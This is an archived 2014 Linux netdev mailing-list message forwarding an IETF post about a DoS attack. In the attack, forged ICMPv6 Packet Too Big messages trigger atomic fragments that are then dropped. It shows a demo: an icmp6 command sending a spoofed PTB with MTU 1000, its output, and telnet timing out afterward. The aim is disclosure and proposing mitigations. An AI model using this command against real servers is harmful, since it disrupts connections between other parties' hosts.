From: Fernando Gont <fernando@gont.com.ar>
Subject: Deprecating the *generation* of IPv6 atomic fragments (Fwd: DoS attacks
 (ICMPv6-based) resulting from IPv6 EH drops)
Date: Tue, 19 Aug 2014 15:58:24 -0300
Message-ID: <53F39E50.1020209@gont.com.ar>
References: <53F33C4F.2070807@si6networks.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
To: netdev <netdev@vger.kernel.org>
Return-path: <netdev-owner@vger.kernel.org>
Received: from web01.jbserver.net ([37.72.100.182]:46911 "EHLO
	web01.jbserver.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1752307AbaHSTRS (ORCPT
	<rfc822;netdev@vger.kernel.org>); Tue, 19 Aug 2014 15:17:18 -0400
In-Reply-To: <53F33C4F.2070807@si6networks.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Folks,

(Heads up):
<http://www.ietf.org/id/draft-gont-6man-deprecate-atomfrag-generation-00.txt>
     -- (Rationale below)

Other than the IPv6 stack update, being able to filter packets based on
the "Next-Hop MTU" field of ICMPv6 Packet Too Big messages could be a
nice thing to have.

Thanks!

Cheers,
Fernando




-------- Forwarded Message --------
Subject: DoS attacks (ICMPv6-based) resulting from IPv6 EH drops
Date: Tue, 19 Aug 2014 09:00:15 -0300
From: Fernando Gont <fgont@si6networks.com>
To: IPv6 Operations <v6ops@ietf.org>
CC: 'opsec@ietf.org' <opsec@ietf.org>

Folks,

Ten days ago or so we published this I-D:
<http://www.ietf.org/internet-drafts/draft-gont-v6ops-ipv6-ehs-in-real-world-00.txt>

Section 5.2 of the I-D discusses a possible attack vector based on a
combination of "forged" ICMPv6 PTB messages and IPv6 frag drops by
operators, along with proposed countermeasures -- on which we'd like to
hear your comments.

Since Section 5.2 is in the draft, let me offer a more informal and
practical explanation:

1) It is known that filtering of packets containing IPv6 Extension
Headers (including the Fragment Header) is widespread (see our I-D above)

2) Let us assume that Host A is communicating with Server B, and that
some node filters fragments between Host A and Server B.

3) An attacker sends a spoofed ICMPv6 PTB to server B, with a "Next Hop
MTU<1280), in the hopes of eliciting "atomic fragments" (see
<http://tools.ietf.org/rfc/rfc6946.txt>) from now on.

4) Now server B starts sending IPv6 atomic fragments... And since they
include a frag header (and in '2)' above we noted that frags are dropped
on that path), these packets get dropped (i.e., DoS).


"Demo" with the icmp6 tool
(<http://www.si6networks.com/tools/ipv6toolkit>) -- (some addresses have
been changed (anonimized), but it is trivial to pick a victim server...)

"2001:db8:1:10:0:1991:8:25" is the server, and
"2001:5c0:1000:a::e7d" is my own address):

---- cut here ----
***** First of all, I telnet to port 80 of the server, and
everything works as expected ****

fgont@satellite:~$ telnet 2001:db8:1:10:0:1991:8:25 80
Trying 2001:db8:1:10:0:1991:8:25...
Connected to 2001:db8:1:10:0:1991:8:25.
Escape character is '^]'.
^CConnection closed by foreign host.

**** Now I send the forget ICMPv6 PTB ****

fgont@satellite:~$ sudo icmp6  --icmp6-packet-too-big -d
2001:db8:1:10:0:1991:8:25 --peer-addr 2001:5c0:1000:a::e7d --mtu 1000 -o
80 -v
icmp6: Security assessment tool for attack vectors based on ICMPv6 error
messages

IPv6 Source Address: 2001:5c0:1000:a::e7d (automatically selected)
IPv6 Destination Address: 2001:db8:1:10:0:1991:8:25
IPv6 Hop Limit: 227 (randomized)
ICMPv6 Packet Too Big (Type 2), Code 0
Next-Hop MTU: 1000
Payload Type: IPv6/TCP (default)
Source Address: 2001:db8:1:10:0:1991:8:25 (automatically-selected)
Destination Address: 2001:5c0:1000:a::e7d
Hop Limit: 237 (randomized)
Source Port: 80	Destination Port: 38189 (randomized)
SEQ Number: 734463213 (randomized)	ACK Number: 866605720 (randomized)
Flags: A (default)	Window: 18944 (randomized)	URG Pointer: 0 (default)
Initial attack packet(s) sent successfully.


***** And now I try the same telnet command as above... but it fails,
because the frags from the server to me are getting dropped somewhere ****

fgont@satellite:~$ telnet 2001:db8:1:10:0:1991:8:25 80
Trying 2001:db8:1:10:0:1991:8:25...
[timeout]
---- cut here ----


Of course, in this particular case I just "shot myself". But one could
do this to DoS connections between mailservers, etc.

A nice question is: what if e.g....

1) some BGP servers accept ICMPv6 PTB that claim an MTU < 1280, and
react (as expected) by generating atomic fragments, *and*,

2) These same BGP servers deem fragmentation as "harmful", and hence
drop such fragments

you could essentially DoS traffic between them

As noted in the I-D, the mitigations seem to be:

1) Artificially limit your packets to 1280, and drop all incoming ICMPv6
PTB, or,

2) Have your device just drop ICMPv6 PTB that claim a Next-Hop MTU
smaller than 1280.

Thoughts?
-- 
Fernando Gont
SI6 Networks
e-mail: fgont@si6networks.com
PGP Fingerprint: 6666 31C6 D484 63B2 8FB1 E3C4 AE25 0D55 1D4E 7492







-- 
Fernando Gont
e-mail: fernando@gont.com.ar || fgont@si6networks.com
PGP Fingerprint: 7809 84F5 322E 45C7 F1C9 3945 96EE A9EF D076 FFF1
